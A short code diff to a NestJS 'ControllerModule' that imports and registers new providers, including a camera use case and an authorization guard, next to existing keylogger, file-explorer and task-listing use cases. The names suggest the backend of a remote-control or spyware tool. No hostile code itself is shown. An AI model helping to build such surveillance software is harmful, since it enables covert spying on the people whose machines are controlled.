@@ -24,6 +24,9 @@ import { ControllerEvents } from "./infrastructure/routes/controller-events.cont
 import { RedisServiceModule } from "@/src/repository/redis/redis.module";
 import { SendKeyloggerToClientUseCase } from "./application/events/send-keylogger.use-case";
 import { MessageBotGuard } from "./application/guards/MessageBot.guard";
+import { ControllerAuthorizationGuard } from "./application/guards/ControllerAuthorization.guard";
+import { DeleteFriendFromControrllerUseCase } from "./application/delete-friend-from-controller.use-case";
+import { CamerasUseCase } from "./application/events/cameras.use-case";
 
 @Module({
   controllers: [ControllerRoutes, ControllerEvents],
@@ -39,7 +42,10 @@ import { MessageBotGuard } from "./application/guards/MessageBot.guard";
     GetExplorerClientUseCase,
     GetTasksUseCase,
     SendKeyloggerToClientUseCase,
+    DeleteFriendFromControrllerUseCase,
+    CamerasUseCase,
     MessageBotGuard,
+    ControllerAuthorizationGuard
   ],
   imports: [
     SharedModule,
@@ -52,4 +58,4 @@ import { MessageBotGuard } from "./application/guards/MessageBot.guard";
     RedisServiceModule,
   ],
 })
-export class ControllerModule {}
+export class ControllerModule { }
